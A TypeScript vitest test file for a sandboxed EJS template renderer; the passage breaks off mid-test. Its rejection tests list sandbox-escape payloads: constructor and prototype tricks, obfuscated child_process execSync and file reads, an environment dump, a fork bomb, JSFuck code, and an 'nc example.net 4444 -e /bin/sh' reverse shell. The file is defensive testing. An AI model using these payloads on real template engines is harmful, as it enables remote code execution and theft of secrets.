import { afterAll, describe, it, expect, vi } from 'vitest';
import fs from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import ejs from 'ejs';
import { safeRender as safeRenderClient } from '../../../src/utils/safeEjs.client';
import { customEscapeFunction } from '../../../src/utils/safeEjs.worker';
import { shutdownSafeEjsPool } from '../../../src/utils/safeEjs.pool';
import conf from '../../../src/config/conf';
import {
  createSafeEjsSandbox,
  safeName,
  safeRender,
  safeReservedPrefix,
  VerifierIllegalAccessError,
  VerifierParsingError,
  VerifierProcessingQuotaExceededError,
} from '../../../src/utils/safeEjs';

const testFilePath = fileURLToPath(import.meta.url);

describe('check safeRender on invalid cases', () => {
  const data = {
    user: {
      name: 'test',
      getName: () => 'test',
    },
  };

  const illegalAccessCases = Object.entries({
    'unknown context variable': '<%= group %>',
    'import 1': '<% import fs from "fs" %>',
    'import 2': '<% const fs = import("fs") %>',
    'require 1': '<% const fs = require("fs") %>',
    '__proto__ access 1': '<%= user.__proto__ %>',
    '__proto__ access 2': '<%= user?.__proto__ %>',
    '__proto__ access 3': '<%= user["__proto__"] %>',
    '__proto__ access 4': '<%= user["__pro" + "to__"] %>',
    '__proto__ access 5': '<% { __proto__ } = user %>',
    '__proto__ access 6': '<% var { __proto__ } = user %>',
    '__proto__ access 7': '<% const { __proto__ } = user %>',
    '__proto__ access 8': '<% let { __proto__ } = user %>',
    '__proto__ access 9': '<% { __proto__: test } = user %>',
    '__proto__ declaration 1': '<% __proto__ = null %>',
    '__proto__ declaration 2': '<% var __proto__ = null %>',
    '__proto__ declaration 3': '<% let __proto__ = null %>',
    '__proto__ declaration 4': '<% const __proto__ = null %>',
    '__proto__ declaration 5': '<% const o = { __proto__: null } %>',
    '__proto__ declaration 6': '<% const o = { "__proto__": null } %>',
    '__proto__ declaration 7': '<% const o = { ["__pr" + "oto__"]: null } %>',
    '__proto__ declaration 8': '<% const o = { [`__proto__`]: 1 } %>',
    'safe override 1': `<% ${safeName('property')} = x %>`,
    'safe override 2': `<% function f(${safeName('Object')}){}  %>`,
    'safe override 3': `<% const f = (${safeName('statement')}) => {}  %>`,
    'safe override 4': `<% try { throw 1 } catch(${safeReservedPrefix}xxx){}  %>`,
    'constructor access 1': '<% ({}).constructor.constructor("")() %>',
    'constructor access 2': '<% Object["constructor"] %>',
    'constructor access 3': '<% a["const" + "ructor"] %>',
    'constructor access 4': '<% a["\u0063onstructor"] %>',
    'constructor access 5': '<% const { ["constructor"]: c } = {} %>',
    'constructor access 6': '<% const { ["constr"+"uctor"]: c } = {} %>',
    'constructor access 7': '<% ({ [`constructor`]: 1 }) %>',
    'constructor access 8': '<% user.constr\u0075ctor %>',
    'constructor access 9': '<% ({}).toString.constr\u0075ctor %>',
    'constructor access 10': '<% (function(){ }).constructor %>',
    'constructor access 11': '<% (()=>{}).constructor %>',
    'constructor declaration 1': '<% const o = { \'constr\u0075ctor\': 1 }; %>',
    'with shadowing 1': `
      <% with ({ ${safeName('property')}: (x) => x }) { %>
        <%= user['constructor'] %>
      <% } %>
      `,
    'with shadowing 2': `
      <% 
        const o = {};
        o['____safe____property'] = (x) => x;
        with (o) { %><%= user['constructor'] %><% }
      %>
      `,
    'with shadowing 3': `
      <% 
        const o = { ['____safe____property']: (x) => x };
        with (o) { %><%= user['constructor'] %><% }
      %>
      `,
    'process exec': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xecSync\'](\'id\')[\'to\'+\'String\']() %>',
    'file read': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'fs\')[\'read\'+\'FileSync\'](\'/etc/hosts\')[\'to\'+\'String\']() %>',
    'environment var': '<%= JSON.stringify(this[\'pro\'+\'cess\'][\'en\'+\'v\']) %>',
    'network access': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'sp\'+\'awn\'](\'/bin/sh\', [\'-c\', \'nc example.net 4444 -e /bin/sh\']) %>',
    'high cpu usage': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xec\'](\':(){ :|:& };:\') %>',
    'JSFuck encoded': '<% [][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]) %>',
    // --- shorthand properties tests ---
    'bare process': '<%= process %>',
    'bare process.env': '<%= process.env %>',
    'bare shorthand process': '<%= ({ process }) %>',
    'shorthand Function escape': '<%= ({Function}).Function("return process")() %>',
    'shorthand process escape': '<%= JSON.stringify(({process}).process.env) %>',
    'shorthand globalThis escape': '<%= ({globalThis}).globalThis.process.env %>',
    'shorthand eval escape': '<% ({eval}).eval("1") %>',
    'shorthand Proxy escape': '<% ({Proxy}).Proxy %>',
    'shorthand Reflect escape': '<% ({Reflect}).Reflect %>',
    'shorthand spread escape': '<% const o = { ...({process}) }; %>',
    'shorthand destructure escape': '<% const { process: p } = { process }; %>',
    'with statement': '<% with (user) { } %>',
    'with guard shadow': "<% const o = Object.fromEntries([['____safe____property', (n) => n]]); with (o) { const c = ({})['constructor']; } %>",
    'include file read': "<% function dead(include){} %><%= include('x') %>",
    'output tag goal class': '<%= class C { static valueOf() { return 1; } } /(process)/\n1 %>',
    'output tag goal function': '<%= function f(){} /(process)/\n1 %>',
    'astral char then output goal': '\u{1F600}<%= class C { static valueOf() { return 1; } } /(process)/\n1 %>',
    'raw output tag goal': '<%- class C { static valueOf() { return 1; } } /(process)/\n1 %>',
    'underscore after escaped output marker': '<% let _ = {} %><%=_["constructor"] %>',
    'underscore after raw output marker': '<% let _ = {} %><%-_["constructor"] %>',
    'legacy getter accessor': "<%= ({}).__lookupGetter__('__proto__') %>",
    'legacy define accessor': '<%= ({}).__defineGetter__ %>',
    'legacy accessor bracket': "<%= ({})['__lookupGetter__']('__proto__') %>",
  }).map(([name, template]) => ({ name, template }));

  [{ label: 'CR', code: 13 }, { label: 'LS', code: 0x2028 }, { label: 'PS', code: 0x2029 }].forEach(({ label, code }) => {
    illegalAccessCases.push({ name: `line comment ended by ${label}`, template: `<% //c${String.fromCharCode(code)}process %>` });
  });

  it.each(illegalAccessCases)('safeRender should fail with VerifierIllegalAccessError for "$name" case', ({ template }) => {
    expect(() => safeRender(template, data)).toThrowError(VerifierIllegalAccessError);
  });

  const processingQuotaExceededCases = Object.entries({
    'high cpu usage': `
        <% while(true) {
           // Infinite loop consuming CPU
           Math.random() * Math.random();
        } %>
      `,
  }).map(([name, template]) => ({ name, template }));

  it.each(processingQuotaExceededCases)('safeRender should fail with VerifierProcessingQuotaExceededError for "$name" case', ({ template }) => {
    expect(() => safeRender(template, data, { maxExecutedStatementCount: 1000 })).toThrowError(VerifierProcessingQuotaExceededError);
    expect(() => safeRender(template, data, { maxExecutionDuration: 100 })).toThrowError(VerifierProcessingQuotaExceededError);
  });

  const parsingErrorCases = Object.entries({
    'invalid EJS': ' <%= ',
    'invalid JS': ' <%= user( %>',
  }).map(([name, template]) => ({ name, template }));

  it.each(parsingErrorCases)('safeRender should fail with VerifierParsingError for "$name" case', ({ template }) => {
    expect(() => safeRender(template, data)).toThrowError(VerifierParsingError);
  });

  it('safeRender should fail with VerifierIllegalAccessError for invalid context', () => {
    expect(() => safeRender('', { eval: 1 })).toThrowError(VerifierIllegalAccessError);
    expect(() => safeRender('<% Object.assign({}, user) %>', { user: { freeze: 1 } })).toThrowError(VerifierIllegalAccessError);
  });
});

describe('check safeRender on valid cases', () => {
  const data = {
    user: {
      name: 'test',
      getName: () => 'test',
    },
  };

  const validCases = Object.entries({
    'empty script': '',
    'ejs with no script': 'ejs with no script',
    'data access': 'Hello <%= user %> !',
    'data member access': 'Hello <%- user.name -%> !',
    'data function access': 'Hello <%= user.getName() %> !',
    'ejs with control flow': `
      <% if (user) { %>
        <h2><%= user.name %></h2>
        <h2><%= user.getName() %></h2>
      <% } %>
    `,
    'object assign': '<% Object.assign({}, {test: 1}) %>',
    'valid shorthand property': '<% const o = { user }; %>',
    'ejs with comment': '<%# This is a comment %>Hello <%= user.name %>',
    'ejs with multiple comments': `
      <%# Comment at start %>
      <% if (user) { %>
        <%# Comment in block %>
        <h2><%= user.name %></h2>
      <% } %>
      <%# Comment at end %>
    `,
    'ejs with comment between code': '<% const x = 1; %><%# Comment here %><%= x %>',
    'no-space output tag': '<%=user.name%>',
    'astral char before output tag': '\u{1F600}<%= user.name %>',
    'raw output no-space': '<%-user.name%>',
    'object literal output': '<%= ({ a: 1 }).a %>',
    'js block comment': '<%= 1 /* c */ + 1 %>',
    'js line comment': '<% // c\n %>ok',
    'whitespace slurp with underscore': '  <%_ JSON.stringify(user) _%>  ',
    'whitespace slurp with dash': '  <%- user.name -%>  ',
  }).map(([name, template]) => ({ name, template }));

  it.each(validCases)('safeRender should succeed for "$name" case', ({ template }) => {
    const safeRendered = safeRender(template, data);
    const unsafeRendered = ejs.render(template, data);
    expect(safeRendered).toEqual(unsafeRendered);
  });
});

describe('check safeRender Date proxy', () => {
  it('should allow Date.now()', () => {
    const template = '<%= Date.now() %>';
    const result = safeRender(template, {});
    expect(result).toMatch(/^\d+$/);
  });

  it('should allow Date.parse()', () => {
    const template = '<%= Date.parse("2024-01-01") %>';
    const result = safeRender(template, {});
    expect(result).toBe('1704067200000');
  });

  it('should allow Date.UTC()', () => {
    const template = '<%= Date.UTC(2024, 0, 1) %>';
    const result = safeRender(template, {});
    expect(result).toBe('1704067200000');
  });

  it('should allow new Date() with no arguments', () => {
    const template = '<%= new Date() %>';
    const result = safeRender(template, {});
    // Should create a valid date string
    expect(result).toMatch(/^\w{3} \w{3} \d{2} \d{4}/);
  });

  it('should allow new Date() with timestamp', () => {
    const template = '<%= new Date(1704067200000) %>';
    const result = safeRender(template, {});
    expect(result).toContain('2024');
  });

  it('should allow new Date() with date string', () => {
    const template = '<%= new Date("2024-01-01") %>';
    const result = safeRender(template, {});
    expect(result).toContain('2024');
  });

  it('should allow new Date() with multiple arguments', () => {
    const template = '<%= new Date(2024, 0, 1).getFullYear() %>';
    const result = safeRender(template, {});
    expect(result).toBe('2024');
  });

  it('should allow using Date instance methods', () => {
    const template = '<% const d = new Date(2024, 0, 15); %><%= d.getDate() %>';
    const result = safeRender(template, {});
    expect(result).toBe('15');
  });

  it('should allow Date operations in templates', () => {
    const template = `
      <% const now = new Date(); %>
      <% const timestamp = Date.now(); %>
      Year: <%= now.getFullYear() %>
      Timestamp: <%= timestamp %>
    `;
    const result = safeRender(template, {});
    expect(result).toMatch(/Year: \d{4}/);
    expect(result).toMatch(/Timestamp: \d+/);
  });

  it('should prevent access to Date.prototype', () => {
    const template = '<%= Date.prototype %>';
    expect(() => safeRender(template, {})).toThrow();
  });

  it('should prevent access to Date.constructor', () => {
    const template = '<%= Date.constructor %>';
    expect(() => safeRender(template, {})).toThrow();
  });
});

describe('check safeRender with NotificationTool (markdown)', () => {
  it('should render markdown to HTML with useNotificationTool flag', async () => {
    const template = '<%- octi.markdownToHtml(description) %>';
    const data = {
      description: '# Title\n\nThis is **bold** and *italic* text.',
    };

    const result = await safeRenderClient(template, data, { useNotificationTool: true });

    expect(result).toContain('<h1>Title</h1>');
    expect(result).toContain('<strong>bold</strong>');
    expect(result).toContain('<em>italic</em>');
  });

  it('should handle markdown with lists', async () => {
    const template = '<%- octi.markdownToHtml(content) %>';
    const data = {
      content: '- Item 1\n- Item 2\n- Item 3',
    };

    const result = await safeRenderClient(template, data, { useNotificationTool: true });

    expect(result).toContain('<ul>');
    expect(result).toContain('<li>Item 1</li>');
    expect(result).toContain('<li>Item 2</li>');
    expect(result).toContain('<li>Item 3</li>');
  });

  it('should handle undefined markdown gracefully', async () => {
    const template = '<%- octi.markdownToHtml(description) || "No description" %>';
    const data = {
      description: undefined,
    };

    const result = await safeRenderClient(template, data, { useNotificationTool: true });

    expect(result).toBe('No description');
  });

  it('should work in complex template with data array', async () => {
    const template = `
      <% data.forEach(function(item) { %>
        <div class="item">
          <h2><%= item.title %></h2>
          <div class="description"><%- octi.markdownToHtml(item.description) %></div>
        </div>
      <% }); %>
    `;
    const data = {
      data: [
        { title: 'Item 1', description: '**Important** information' },
        { title: 'Item 2', description: 'Another *description*' },
      ],
    };

    const result = await safeRenderClient(template, data, { useNotificationTool: true });

    expect(result).toContain('<h2>Item 1</h2>');
    expect(result).toContain('<strong>Important</strong>');
    expect(result).toContain('<h2>Item 2</h2>');
    expect(result).toContain('<em>description</em>');
  });

  it('should fail when useNotificationTool flag is not set', async () => {
    const template = '<%- octi.markdownToHtml(description) %>';
    const data = {
      description: '# Title',
    };

    // Without the flag, octi should not be available
    await expect(
      safeRenderClient(template, data),
    ).rejects.toThrow(/octi/i);
  });
});

describe('check safeRenderClient error handling and worker termination detection', () => {
  it('should report timeout error when rendering takes too long', async () => {
    // Template with infinite loop should timeout
    const template = '<% while(true) {} %>';
    const data = {};

    await expect(
      safeRenderClient(template, data, { timeout: 100 }),
    ).rejects.toThrow(/timeout after 100ms/i);
  });

  it('should preserve worker error when worker fails before timeout', async () => {
    // Template that causes a worker error
    const template = '<%= nonExistentVariable.property %>';
    const data = {};

    await expect(
      safeRenderClient(template, data, { timeout: 5000 }),
    ).rejects.toThrow(/nonExistentVariable/i);
  });

  it.skip('should handle memory limit errors correctly', async () => {
    // Template that tries to allocate too much memory
    const template = '<% const arr = new Array(1000000000).fill("x"); %><%= arr.length %>';
    const data = {};

    await expect(
      safeRenderClient(template, data, { timeout: 5000 }),
    ).rejects.toThrow();
  });

  it('should handle syntax errors in template', async () => {
    // Template with syntax error
    const template = '<% const x = ; %>';
    const data = {};

    await expect(
      safeRenderClient(template, data),
    ).rejects.toThrow();
  });

  it('should preserve error type when worker encounters runtime error', async () => {
    // Template that causes a runtime error (division by zero leads to Infinity, but accessing undefined property causes error)
    const template = '<%= undefined.nonExistentProperty %>';
    const data = {};

    await expect(
      safeRenderClient(template, data),
    ).rejects.toThrow(/undefined/i);
  });

  it('should handle template with invalid data access gracefully', async () => {
    // Template trying to access undefined deeply nested property
    const template = '<%= data.deep.nested.property.that.does.not.exist %>';
    const data = {};

    await expect(
      safeRenderClient(template, data),
    ).rejects.toThrow();
  });

  it('should succeed with valid template and reasonable timeout', async () => {
    const template = '<% for(let i = 0; i < 1000; i++) {} %>Success';
    const data = {};

    const result = await safeRenderClient(template, data, { timeout: 5000 });
    expect(result).toBe('Success');
  });
});

describe('check safeRender with escape', () => {
  it('should allow escape function in templates', () => {
    const template = '<% function parseLink(text) { return escape(text); } %><%- parseLink("<script>alert(1)</script>") %>';
    const result = safeRender(template, {});
    expect(result).toEqual('%3Cscript%3Ealert%281%29%3C/script%3E');
    expect(result).not.toContain('<script>');
  });

  it('should work with parseMarkdownLink function pattern from simplified email template', () => {
    const template = `
      <% function parseMarkdownLink(text) {
        if (!text) return '';
        const regex = /(.*)\\[(.*?)\\]\\((.*?)\\)/;
        const match = text.match(regex);
        if (match) {
          const prefix = match[1];
          const linkText = match[2].split(' ').map((e) => escape(e)).join(' ');
          const linkUrl = match[3].split(' ').map((e) => escape(e)).join(' ');
          return prefix + '<a href="' + linkUrl +'">' + linkText + '</a>';
        }
        return text;
      } %>
      <%- parseMarkdownLink('Check this [my link](http://example.com)') %>
    `;
    const result = safeRender(template, {});
    expect(result).toContain('Check this <a href="http%3A//example.com">my link</a>');
  });

  it('should work with parseMarkdownLink and special characters', () => {
    const template = `
      <% function parseMarkdownLink(text) {
        if (!text) return '';
        const regex = /(.*)\\[(.*?)\\]\\((.*?)\\)/;
        const match = text.match(regex);
        if (match) {
          const prefix = match[1];
          const linkText = match[2].split(' ').map((e) => escape(e)).join(' ');
          const linkUrl = match[3].split(' ').map((e) => escape(e)).join(' ');
          return prefix + '<a href="' + linkUrl +'">' + linkText + '</a>';
        }
        return text;
      } %>
      <%- parseMarkdownLink('[<script>malicious</script>](javascript:alert(1))') %>
    `;
    const result = safeRender(template, {});
    expect(result).not.toContain('<script>');
    expect(result).toContain('<a href="javascript%3Aalert%281">%3Cscript%3Emalicious%3C/script%3E</a>');
  });

  it('should let the template data shadow escape', () => {
    expect(safeRender('<%- escape("a b:c") %>', { escape: (s: string) => s.toUpperCase() })).toEqual('A B:C');
  });
});

describe('check safeRender does not leak host globals through a defined binding', () => {
  const hostGlobals = ['process', 'global', 'Buffer', 'fetch', 'WebAssembly', 'crypto', 'setTimeout', 'structuredClone'];
  it.each(hostGlobals)('blocks %s smuggled through a dead parameter', (name) => {
    const formula = `(() => { function dead(${name}) { return ${name}; } return typeof ${name}; })()`;
    expect(() => safeRender(`<?- ${formula} ?>`, {}, { delimiter: '?' })).toThrow(VerifierIllegalAccessError);
  });
  it.each(hostGlobals)('blocks %s smuggled through a local var', (name) => {
    expect(() => safeRender(`<?- (function () { var ${name}; return typeof ${name}; })() ?>`, {}, { delimiter: '?' })).toThrow(VerifierIllegalAccessError);
  });
  it.each(hostGlobals)('blocks %s written through a destructuring assignment', (name) => {
    expect(() => safeRender(`<?- ([${name}] = [1], 1) ?>`, {}, { delimiter: '?' })).toThrow(VerifierIllegalAccessError);
  });
});

describe('check safeRender renders with data keys that are reserved words', () => {
  it.each(['class', 'return', 'for', 'default', 'with', 'in'])('renders when a data key is the reserved word "%s"', (key) => {
    expect(safeRender('static content', { [key]: 1 })).toEqual('static content');
  });
});

describe('check safeRender keeps shared globals intact', () => {
  const render = (formula: string) => safeRender(`<?- ${formula} ?>`, {}, { delimiter: '?' });

  const writeForms: [string, string][] = [
    ['simple assignment', '(escape = 1, typeof escape)'],
    ['compound assignment', '(escape += 1, typeof escape)'],
    ['postfix update', '(escape++, typeof escape)'],
    ['prefix update', '(++escape, typeof escape)'],
    ['array destructuring', '([escape] = [1], typeof escape)'],
    ['object destructuring shorthand', '({escape} = { escape: 1 }, typeof escape)'],
    ['object destructuring renamed', '({ x: escape } = { x: 1 }, typeof escape)'],
    ['nested destructuring', '(({ a: [escape] } = { a: [1] }), typeof escape)'],
  ];
  it.each(writeForms)('does not let a template corrupt escape via %s', (_label, formula) => {
    const before = (globalThis as unknown as { escape: unknown }).escape;
    void render(formula);
    expect((globalThis as unknown as { escape: unknown }).escape).toBe(before);
  });

  it('does not let a template corrupt Object', () => {
    const before = globalThis.Object;
    void render('([Object] = [1], typeof Object)');
    expect(globalThis.Object).toBe(before);
  });

  it('rejects the constructor gadget even when a template reassigns String', () => {
    const before = globalThis.String;
    const payload = '(String = function (n) { return { startsWith: function () { return false }, toString: function () { return n } } }, '
      + '({})["constructor"]["constructor"]("return 1")())';
    expect(() => render(payload)).toThrow(VerifierIllegalAccessError);
    expect(globalThis.String).toBe(before);
  });

  it('still exposes the allow-listed globals to templates', () => {
    expect(render("escape('a b')")).toEqual('a%20b');
    expect(render('String(42)')).toEqual('42');
    expect(render("Object.keys({ a: 1, b: 2 }).join(',')")).toEqual('a,b');
    expect(render('Math.max(1, 2, 3)')).toEqual('3');
  });
});

describe('check safeRender resolves escaped keys before checking them', () => {
  const guardShadow = (key: string) => '<% const o = { "' + key + '": function (x) { return x; } }; %>'
    + '<% with (o) { %><%- (() => 0)["constructor"]("return 42")() %><% } %>';

  const escapedReservedKeys = [
    ['unicode escape', '____s\\u0061fe____property'],
    ['braced unicode escape', '____s\\u{61}fe____property'],
    ['hex escape', '____s\\x61fe____property'],
  ];
  it.each(escapedReservedKeys)('blocks a guard key hidden with a %s', (_label, key) => {
    expect(() => safeRender(guardShadow(key), {})).toThrow(VerifierIllegalAccessError);
  });

  it('blocks a forbidden property spelled with an escape', () => {
    expect(() => safeRender('<%- ({ "con\\u0073tructor": 1 })["a"] %>', {})).toThrow(VerifierIllegalAccessError);
    expect(() => safeRender('<%- ({ "__pro\\u0074o__": 1 })["a"] %>', {})).toThrow(VerifierIllegalAccessError);
  });

  it('rejects an escaped key even when it resolves to a harmless name', () => {
    expect(() => safeRender('<%- Object.keys({ "caf\\u00e9": 1 })[0] %>', {})).toThrow(VerifierIllegalAccessError);
  });

  it('still accepts an escape inside a string value', () => {
    expect(safeRender('<%- "caf\\u00e9" %>', {})).toEqual('caf\u00e9');
  });
});

describe('check safeRender on real files', () => {
  const data = {
    content: [
      {
        events: [
          {
            instance_id: '1234',
            message: 'event message',
          },
        ],
      },
    ],
    data: [
      {
        instance: {
          id: '1234',
          name: 'test instance',
          report_types: ['type1', 'type2'],
          labels: ['lbl1', 'lbl2'],
          description: 'test description',
          published: true,
          content: [],
          events: [
            {
              instance_id: '1234',
              message: 'event message',
            },
          ],
        },
      },
    ],
    notification: {
      name: 'test notification',
      created: Date.now(),
    },
  };

  const fileTestCases = [
    'template-1.html',
    'template-2.html',
    'template-3.html',
    'template-4.html',
    'template-5.json',
    'template-6.json',
    'template-7.json',
  ];

  it.each(fileTestCases.map((name) => ({ name })))(
    'safeRender should succeed for template "$name"',
    async ({ name }) => {
      const templateFile = `${testFilePath.substring(0, testFilePath.lastIndexOf('.'))}.${name}`;
      const template = await fs.readFile(templateFile, 'utf8');
      const escape = name.includes('.json') ? customEscapeFunction : undefined;
      // Some templates embed a live `new Date()`/timestamp. Freeze the clock so both renders
      // below see the exact same instant, avoiding a flaky 1-second drift across the second boundary.
      vi.useFakeTimers();
      vi.setSystemTime(new Date());
      try {
        const safeRendered = await safeRender(template, data, { useNotificationTool: true, escape });
        const unsafeRendered = ejs.render(template, data);
        expect(safeRendered).toEqual(unsafeRendered);
      } finally {
        vi.useRealTimers();
      }
    },
  );
});

describe('check safeRenderClient worker pool', () => {
  it('should render many templates in a row', async () => {
    const rendered = [];
    for (let i = 0; i < 12; i += 1) {
      rendered.push(await safeRenderClient('<%= it.i %>', { it: { i } }));
    }
    expect(rendered).toEqual(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']);
  });

  it('should render concurrent templates without mixing up the replies', async () => {
    const rendered = await Promise.all(
      Array.from({ length: 12 }, (_, i) => safeRenderClient('<%= it.i %>', { it: { i } })),
    );
    expect(rendered).toEqual(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']);
  });

  it('should keep serving renders after a template failed', async () => {
    await expect(safeRenderClient('<%= nonExistentVariable.property %>', {})).rejects.toThrow();
    expect(await safeRenderClient('<%= it.value %>', { it: { value: 'still alive' } })).toEqual('still alive');
  });

  it('should keep serving renders after a template timed out', async () => {
    await expect(
      safeRenderClient('<% while(true) {} %>', {}, { timeout: 100 }),
    ).rejects.toThrow(/timeout after 100ms/i);
    // The worker that hung is terminated, not handed to the next caller.
    expect(await safeRenderClient('<%= it.value %>', { it: { value: 'after timeout' } })).toEqual('after timeout');
  });

  it('should not make a render wait behind busy workers', async () => {
    const poolSize: number = conf.get('safe_ejs:pool_size');
    const busy = Array.from({ length: poolSize }, () => safeRenderClient('<% while(true) {} %>', {}, { timeout: 1500 }).catch(() => 'busy'));
    const start = performance.now();
    expect(await safeRenderClient('<%= it.value %>', { it: { value: 'not queued' } }, { timeout: 1000 })).toEqual('not queued');
    expect(performance.now() - start).toBeLessThan(500);
    await Promise.all(busy);
  });

  it('should reject in-flight renders on shutdown and recover afterwards', async () => {
    const poolSize: number = conf.get('safe_ejs:pool_size');
    const settled = (promise: Promise<unknown>) => promise.then(() => 'resolved').catch(() => 'rejected');
    const inFlight = Array.from({ length: poolSize + 1 }, () => settled(safeRenderClient('<% while(true) {} %>', {}, { timeout: 30000 })));
    await new Promise((resolve) => setTimeout(resolve, 200));
    await shutdownSafeEjsPool();
    expect(await Promise.all(inFlight)).toEqual(Array.from({ length: poolSize + 1 }, () => 'rejected'));
    expect(await safeRenderClient('<%= it.value %>', { it: { value: 'after shutdown' } })).toEqual('after shutdown');
  });

  it('should reject renders started while a shutdown is in progress', async () => {
    const shutdown = shutdownSafeEjsPool();
    await expect(safeRenderClient('<%= 1 %>', {})).rejects.toThrow(/shutting down/i);
    await shutdown;
    expect(await safeRenderClient('<%= it.value %>', { it: { value: 'recovered' } })).toEqual('recovered');
  });

  it('should not let async work left by one render starve the next', async () => {
    await expect(safeRenderClient('<% (async () => { for (;;) { await 0; } })() %>ok', {}, { timeout: 1500 }))
      .rejects.toThrow(/timeout/i);
    expect(await safeRenderClient('<%= it.value %>', { it: { value: 'after poison' } }, { timeout: 1500 })).toEqual('after poison');
    await shutdownSafeEjsPool();
  }, 20000);

  it('should return an empty string without reaching a worker', async () => {
    expect(await safeRenderClient('', {})).toEqual('');
  });

  afterAll(async () => {
    await shutdownSafeEjsPool();
  });
});

describe('check render isolation between templates', () => {
  const GLOBALS = ['Math', 'JSON', 'Date', 'Array', 'String', 'Number', 'Boolean', 'RegExp'];

  it.each(GLOBALS)('should not carry a value written on %s into the next render', async (name) => {
    expect(await safeRender(`<% ${name}.leaked = 'from-another-render' %>ok`, {})).toEqual('ok');
    expect(await safeRender(`<%= typeof ${name}.leaked %>`, {})).toEqual('undefined');
  });

  it.each(GLOBALS)('should not leak a write on %s into the host', async (name) => {
    await safeRender(`<% ${name}.leakedToHost = 'escaped' %>ok`, {});
    expect((globalThis as Record<string, any>)[name].leakedToHost).toBeUndefined();
  });

  it('should not carry render data parked on a global into the next render', async () => {
    await safeRender('<% Math.stash = it.secret %>ok', { it: { secret: 'tenant-a-payload' } });
    expect(await safeRender('<%= typeof Math.stash %>', {})).toEqual('undefined');
  });

  it('should not expose a host global when a context variable shadowing it is deleted', async () => {
    expect(await safeRender('<% delete process %><%= typeof process %>', { process: 'benign' })).toEqual('undefined');
  });

  it.each(['keys', 'values', 'entries', 'fromEntries'])('should not carry a write on Object.%s into the next render', async (member) => {
    expect(await safeRender(`<% Object.${member}.leaked = 'from-another-render' %>ok`, {})).toEqual('ok');
    expect(await safeRender(`<%= typeof Object.${member}.leaked %>`, {})).toEqual('undefined');
  });

  it.each(['keys', 'values', 'entries', 'fromEntries'])('should not leak a write on Object.%s into the host', async (member) => {
    await safeRender(`<% Object.${member}.leaked = 'escaped' %>ok`, {});
    expect(((Object as any)[member] as any).leaked).toBeUndefined();
  });

  it('should keep Object members isolated through the worker pool as well', async () => {
    expect(await safeRenderClient("<% Object.keys.leaked = 'through-the-pool' %>ok", {})).toEqual('ok');
    expect(await safeRenderClient('<%= typeof Object.keys.leaked %>', {})).toEqual('undefined');
    await shutdownSafeEjsPool();
  });

  it('should not carry a write on octi.markdownToHtml into the next render', async () => {
    expect(await safeRender("<% octi.markdownToHtml.leaked = 'from-another-render' %>ok", {}, { useNotificationTool: true })).toEqual('ok');
    expect(await safeRender('<%= typeof octi.markdownToHtml.leaked %>', {}, { useNotificationTool: true })).toEqual('undefined');
  });

  it('should keep octi isolated through the worker pool as well', async () => {
    expect(await safeRenderClient("<% octi.markdownToHtml.leaked = 'through-the-pool' %>ok", {}, { useNotificationTool: true })).toEqual('ok');
    expect(await safeRenderClient('<%= typeof octi.markdownToHtml.leaked %>', {}, { useNotificationTool: true })).toEqual('undefined');
    await shutdownSafeEjsPool();
  });

  it('should keep renders isolated through the worker pool as well', async () => {
    expect(await safeRenderClient("<% Math.leaked = 'through-the-pool' %>ok", {})).toEqual('ok');
